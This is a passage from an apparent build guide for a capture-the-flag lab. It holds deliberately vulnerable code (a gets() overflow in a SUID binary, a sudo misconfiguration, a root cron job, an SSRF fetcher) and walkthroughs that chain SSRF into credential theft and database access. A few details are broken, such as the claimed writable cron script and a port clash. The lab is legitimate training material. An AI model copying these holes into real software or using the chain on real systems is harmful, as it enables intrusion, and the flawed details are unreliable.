sudo unzip -q ghidra_10.4_PUBLIC_20230711.zip
sudo ln -s /opt/ghidra_10.4_PUBLIC ~/ghidra

# Add to PATH
echo 'export PATH=$PATH:~/ghidra/bin' >> ~/.bashrc

# Create challenge directory
mkdir -p ~/challenges/stage6
cp target.bin ~/challenges/stage6/

echo "[✓] VM setup complete"
echo "[*] Access: Connect via SSH"
echo "[*] Challenge: ~/challenges/stage6/target.bin"
```

### **6.4 Reverse Engineering Challenge Guide**

**File: `stages/stage6-reverse-engineering/SOLUTION.md`**

```markdown
# Stage 6: Reverse Engineering Solution Guide

## Quick Solution (15 minutes)

### Method 1: String Extraction (Easiest)
```bash
strings target.bin | grep SHADOW
# Output: SHADOWNET{RE_ANALYSIS_SUCCESS}
```

### Method 2: Ghidra Analysis (Best Learning)
1. Start Ghidra GUI
2. File → Create New Project → select ~/challenges/stage6/
3. File → Open → target.bin
4. Let auto-analysis complete (~30 seconds)
5. Search → For Strings → "SHADOW"
6. Double-click result to jump to code
7. Look for strcmp() call comparing input against the flag

### Method 3: Objdump Disassembly (Manual)
```bash
objdump -d target.bin | grep -A20 "check_access"
# Look for string comparisons and hardcoded addresses
```

## Expected Ghidra Decompiler Output

```c
undefined4 check_access(char *input)
{
  int iVar1;
  
  iVar1 = strcmp(input, "SHADOWNET{RE_ANALYSIS_SUCCESS}");
  if (iVar1 == 0) {
    printf("Access granted!\n");
    printf("Flag: %s\n", "SHADOWNET{RE_ANALYSIS_SUCCESS}");
    return 1;
  }
  printf("Access denied.\n");
  return 0;
}
```

## Flag
`SHADOWNET{RE_ANALYSIS_SUCCESS}`
```

---

## **STAGE 7: Linux Privilege Escalation**

**Delivery Method:** 🖥️ Dedicated Ubuntu VM  
**Difficulty:** Moderate-Hard  
**Build Time:** 2 days

### **7.1 Create Vulnerable Privilege Escalation Vector**

**File: `stages/stage7-linux-security/setup_privesc.sh`**

```bash
#!/bin/bash

echo "[*] Setting up privilege escalation vectors..."

# Create low-privilege user for players to SSH into
sudo useradd -m -s /bin/bash player
echo "player:password123" | sudo chpasswd

# === Vector 1: SUID Binary ===
echo "[+] Creating SUID binary vulnerability..."

# Create a vulnerable binary
cat > /tmp/vulnerable.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    char buffer[64];
    printf("Enter data: ");
    gets(buffer);  // Intentional buffer overflow!
    printf("You entered: %s\n", buffer);
    return 0;
}
EOF

gcc -o /usr/local/bin/vulnerable /tmp/vulnerable.c -z execstack 2>/dev/null
chmod 4755 /usr/local/bin/vulnerable  # SUID bit set!
chown root:root /usr/local/bin/vulnerable

echo "[+] SUID binary created: /usr/local/bin/vulnerable"

# === Vector 2: Sudo Misconfiguration ===
echo "[+] Setting up sudo misconfiguration..."

# Create a script that player can run as sudo
cat > /tmp/admin_script.sh << 'EOF'
#!/bin/bash
echo "Admin operations log:"
cat /var/log/auth.log | tail -20
EOF

sudo chmod +x /tmp/admin_script.sh
echo "player ALL=(ALL) NOPASSWD: /tmp/admin_script.sh" | sudo tee -a /etc/sudoers

# === Vector 3: Cron Job as Root ===
echo "[+] Setting up cron job vulnerability..."

cat > /tmp/backup.sh << 'EOF'
#!/bin/bash
tar -czf /tmp/backup.tar.gz /home/player
EOF

sudo chmod +x /tmp/backup.sh
echo "*/5 * * * * /tmp/backup.sh" | sudo crontab -

# === Flag File ===
echo "[+] Creating flag file..."
echo "SHADOWNET{LINUX_PRIVILEGE_ESCALATION}" | sudo tee /root/flag.txt
sudo chmod 600 /root/flag.txt

echo "[✓] Privilege escalation vectors ready"
echo "[*] Player SSH credentials:"
echo "   Username: player"
echo "   Password: password123"
```

### **7.2 Enumeration Guide for Players**

**File: `stages/stage7-linux-security/ENUMERATION_GUIDE.md`**

```markdown
# Stage 7: Linux Privilege Escalation Guide

## Enumeration Steps

### Step 1: Check SUID Binaries
```bash
find / -perm -4000 2>/dev/null
# Look for unusual binaries like 'vulnerable'
```

### Step 2: Check Sudo Permissions
```bash
sudo -l
# See what you can run as sudo without password
```

### Step 3: Check Cron Jobs
```bash
crontab -l
sudo crontab -l
```

### Step 4: Check File Permissions
```bash
ls -la /home/player/
ls -la /tmp/
```

## Exploitation Vectors

### Via SUID Binary (Buffer Overflow)
```bash
/usr/local/bin/vulnerable
# Enter a long string to overflow buffer
# (Requires understanding of buffer overflow - may be too advanced)
```

### Via Sudo Misconfiguration (Easiest)
```bash
sudo /tmp/admin_script.sh
# This is already allowed without password
```

### Via Cron Job
```bash
cat /tmp/backup.sh
# The script is writable by player! Modify it to escalate
echo "cat /root/flag.txt > /tmp/flag_output.txt" >> /tmp/backup.sh
# Wait 5 minutes for cron to run
cat /tmp/flag_output.txt
```

## Flag Location
`/root/flag.txt` (readable only by root)
`SHADOWNET{LINUX_PRIVILEGE_ESCALATION}`
```

---

## **STAGE 8: Networking (Capstone - SSRF + Pivoting)**

**Delivery Method:** 🖥️ Isolated VM Cluster  
**Difficulty:** Hard  
**Build Time:** 3-4 days  
**Architecture:** Entry VM + Database VM on internal subnet

### **8.1 Entry Host Setup**

**File: `stages/stage8-networking/entry-host/app.py`**

```python
#!/usr/bin/env python3

from flask import Flask, request, render_template
import requests
import socket

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/fetch', methods=['GET'])
def fetch():
    """
    VULNERABLE: Server-Side Request Forgery (SSRF)
    Allows players to make requests to internal network
    """
    url = request.args.get('url', '')
    
    if not url:
        return {'error': 'URL parameter missing'}, 400
    
    # Validate URL is at least somewhat formed
    if not url.startswith('http'):
        return {'error': 'Invalid URL'}, 400
    
    try:
        # NO VALIDATION: Server blindly fetches any URL!
        response = requests.get(url, timeout=5)
        return {
            'url': url,
            'status': response.status_code,
            'content': response.text[:500]  # Limit output
        }
    except Exception as e:
        return {
            'url': url,
            'error': str(e)
        }, 500

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    """Fake admin endpoint (not directly accessible to players)"""
    return {'message': 'This endpoint doesn\'t do anything yet'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000, debug=False)
```

**File: `stages/stage8-networking/entry-host/templates/index.html`**

```html
<!DOCTYPE html>
<html>
<head>
    <title>NexaCorp - URL Fetcher Service</title>
    <style>
        body { font-family: Arial; background: #f0f0f0; padding: 20px; }
        .container { background: white; padding: 30px; border-radius: 5px; max-width: 600px; margin: 0 auto; }
        input { width: 90%; padding: 10px; }
        button { padding: 10px 20px; background: #667eea; color: white; border: none; cursor: pointer; }
        .result { background: #e8f4f8; padding: 15px; margin-top: 20px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>NexaCorp - Internal URL Fetcher</h1>
        <p>Fetch content from URLs (internal testing only)</p>
        
        <form id="fetchForm">
            <label>URL to fetch:</label><br>
            <input type="text" id="urlInput" placeholder="http://example.com" required><br>
            <button type="submit">Fetch</button>
        </form>
        
        <div id="result" class="result" style="display:none;">
            <h3>Response:</h3>
            <pre id="resultContent"></pre>
        </div>
    </div>
    
    <script>
        document.getElementById('fetchForm').onsubmit = async function(e) {
            e.preventDefault();
            const url = document.getElementById('urlInput').value;
            
            const response = await fetch(`/fetch?url=${encodeURIComponent(url)}`);
            const data = await response.json();
            
            document.getElementById('resultContent').textContent = JSON.stringify(data, null, 2);
            document.getElementById('result').style.display = 'block';
        };
    </script>
</body>
</html>
```

### **8.2 Database Host Setup**

**File: `stages/stage8-networking/db-host/metadata_service.py`**

```python
#!/usr/bin/env python3

from flask import Flask, jsonify
import json

app = Flask(__name__)

# Simulated cloud metadata service
METADATA = {
    "database": {
        "host": "192.168.100.10",
        "port": 3306,
        "username": "db_user",
        "password": "SecurePass123",
        "database": "nexacorp"
    },
    "credentials": {
        "api_key": "sk-1234567890abcdef",
        "secret": "secret-key-for-internal-api"
    }
}

@app.route('/metadata/db-credentials')
def db_credentials():
    """Return database credentials via metadata service"""
    return jsonify(METADATA['database'])

@app.route('/metadata/all')
def all_metadata():
    """Return all metadata"""
    return jsonify(METADATA)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
```

**File: `stages/stage8-networking/db-host/init_mysql.sql`**

```sql
-- Create database
CREATE DATABASE IF NOT EXISTS nexacorp;
USE nexacorp;

-- Create flags table
CREATE TABLE IF NOT EXISTS flags (
    id INT PRIMARY KEY AUTO_INCREMENT,
    challenge VARCHAR(100) UNIQUE,
    flag VARCHAR(200)
);

-- Insert final flag
INSERT INTO flags (challenge, flag) VALUES ('final_breach', 'SHADOWNET{FULL_NETWORK_BREACH_COMPLETE}');

-- Create user with limited permissions
CREATE USER IF NOT EXISTS 'db_user'@'%' IDENTIFIED BY 'SecurePass123';
GRANT SELECT ON nexacorp.* TO 'db_user'@'%';
FLUSH PRIVILEGES;
```

### **8.3 Network Isolation Setup**

**File: `stages/stage8-networking/network_config.sh`**

```bash
#!/bin/bash

echo "[*] Setting up isolated network for Stage 8..."

# Create internal bridge network (only between Entry and DB VMs)
# VirtualBox: Create a new Host-Only Network
VBoxManage hostonlyif create

# OR for Docker Compose:
# docker network create --driver bridge internal-net

echo "[+] Network setup complete"
echo "[*] Entry VM: accessible from player at http://<host>:3000"
echo "[*] DB VM: only accessible via Entry VM (192.168.100.10)"
```

### **8.4 Complete Exploitation Chain**

**File: `stages/stage8-networking/SOLUTION.md`**

```markdown
# Stage 8: Network Pivoting Solution

## Step-by-Step Exploitation

### Step 1: Access Entry Host
```bash
curl http://<entry-host-ip>:3000/
# See the URL fetcher form
```

### Step 2: Discover SSRF Vulnerability
```bash
curl "http://<entry-host-ip>:3000/fetch?url=http://google.com"
# Entry host fetches the URL on behalf of player
```

### Step 3: Scan Internal Network via SSRF
```bash
# Scan for internal hosts
curl "http://<entry-host-ip>:3000/fetch?url=http://192.168.100.10:3306"
# MySQL port is likely open (connection refused means it exists)

curl "http://<entry-host-ip>:3000/fetch?url=http://192.168.100.10:8080"
# Port 8080 is accessible!
```

### Step 4: Extract Credentials via Metadata Service
```bash
curl "http://<entry-host-ip>:3000/fetch?url=http://192.168.100.10:8080/metadata/db-credentials"

# Response:
{
  "host": "192.168.100.10",
  "port": 3306,
  "username": "db_user",
  "password": "SecurePass123",
  "database": "nexacorp"
}
```

### Step 5: Connect to Database and Retrieve Flag
```bash
mysql -h 192.168.100.10 -u db_user -p "SecurePass123" -e "SELECT flag FROM flags WHERE challenge='final_breach';"

# Output:
flag
SHADOWNET{FULL_NETWORK_BREACH_COMPLETE}
```

## Flag
`SHADOWNET{FULL_NETWORK_BREACH_COMPLETE}`
```

---

## 🐳 **PART 4: Docker Compose Orchestration**

**File: `docker-compose.yml` (Complete)**

```yaml
version: '3.8'

services:
  # ============= Dashboard =============
  dashboard:
    build:
      context: ./dashboard
      dockerfile: Dockerfile
    container_name: shadownet-dashboard
    ports:
      - "5000:5000"  # Web dashboard
    environment:
      - FLASK_ENV=production
      - DATABASE_URL=sqlite:///scores.db
    volumes:
      - ./dashboard/database.db:/app/database.db
    networks:
      - frontend
    restart: unless-stopped
    depends_on:
      - stage3-crypto
      - stage4-web
      - stage5-scripting

  # ============= Stage 3: Cryptography =============
  stage3-crypto:
    build:
      context: ./stages/stage3-cryptography
      dockerfile: Dockerfile
    container_name: stage3-crypto
    ports:
      - "5000:5000"
    networks:
      - stage3-net
      - backend
    restart: unless-stopped
    environment:
      - KEY=SECRET
      - FLAG=SHADOWNET{VIGENERE_ORACLE_BROKEN}

  # ============= Stage 4: Web Security =============
  stage4-web:
    build:
      context: ./stages/stage4-web-security
      dockerfile: Dockerfile
    container_name: stage4-web
    ports:
      - "3000:3000"
    networks:
      - stage4-net
      - backend
    restart: unless-stopped
    volumes:
      - ./stages/stage4-web-security/database.db:/app/database.db
    environment:
      - FLASK_ENV=production

  # ============= Stage 5: Scripting =============
  stage5-scripting:
    build:
      context: ./stages/stage5-scripting
      dockerfile: Dockerfile
    container_name: stage5-scripting
    ports:
      - "5001:5001"
    networks:
      - stage5-net
      - backend
    restart: unless-stopped

networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge
  stage3-net:
    driver: bridge
  stage4-net:
    driver: bridge
  stage5-net:
    driver: bridge
```

---

## 🚀 **PART 5: Deployment Guide**

### **5.1 Start All Services**

```bash
# Clone repository
git clone https://github.com/YourUsername/shadownet-ctf.git
cd shadownet-ctf

# Build and start Docker services
docker-compose up -d

# Verify services are running
docker-compose ps

# View logs
docker-compose logs -f
```

### **5.2 Setup VMs**

```bash
# For Stage 6 (RE Sandbox)
cd stages/stage6-reverse-engineering
bash build_binary.sh
# Create Ubuntu 22.04 VM, run vm_setup.sh inside it
bash vm_setup.sh

# For Stage 7 (Linux Security)
cd stages/stage7-linux-security
# Create Ubuntu 22.04 VM, run setup_privesc.sh inside it
sudo bash setup_privesc.sh

# For Stage 8 (Networking Capstone)
cd stages/stage8-networking
# Create 2 Ubuntu 22.04 VMs, configure network isolation
bash network_config.sh
```

### **5.3 Initialize Database**

```bash
# Initialize CTF database
cd dashboard
python3 << 'EOF'
from database import init_db
init_db()
print("✅ Database initialized")
EOF
```

### **5.4 Verify All Stages**

```bash
cd tests
bash test_all_stages.sh
```

---

## ✅ **PART 6: Quick Reference**

| Stage | Type | Port | Status Check |
|-------|------|------|---|
| 1 | Static | 5000 (dashboard) | curl http://localhost:5000 |
| 2 | Static | 5000 (dashboard) | curl http://localhost:5000 |
| 3 | Docker | 5000 | nc localhost 5000 |
| 4 | Docker | 3000 | curl http://localhost:3000 |
| 5 | Docker | 5001 | nc localhost 5001 |
| 6 | VM | SSH | ssh player@<vm-ip> |
| 7 | VM | SSH | ssh player@<vm-ip> |
| 8 | VMs | SSH/HTTP | Combined test |

---

## 🎯 **PART 7: Testing Checklist**

```bash
# Before going live, verify:

☐ Stage 1-2: Static files load in dashboard
☐ Stage 3: Vigenère oracle responds to connections
☐ Stage 4: SQLi vulnerability works as expected
☐ Stage 5: Token service generates predictable tokens
☐ Stage 6: Binary reverse-engineering works in Ghidra
☐ Stage 7: Privilege escalation vectors are exploitable
☐ Stage 8: SSRF on Entry Host allows internal network access
☐ Dashboard: Flag submission and scoring works
☐ Database: Stores all flags securely (hashed)
☐ Isolation: Docker networks prevent unwanted access
☐ Snapshots: VM snapshots can be reverted successfully
```

---

## 📚 **Additional Resources**

- Docker Documentation: https://docs.docker.com
- VirtualBox Manual: https://www.virtualbox.org/manual/
- Flask Documentation: https://flask.palletsprojects.com
- Ghidra Tutorial: https://github.com/NationalSecurityAgency/ghidra

---

**Status:** Ready for implementation  
**Last Updated:** 2024-09-19  
**Maintained By:** ShadowNet CTF Team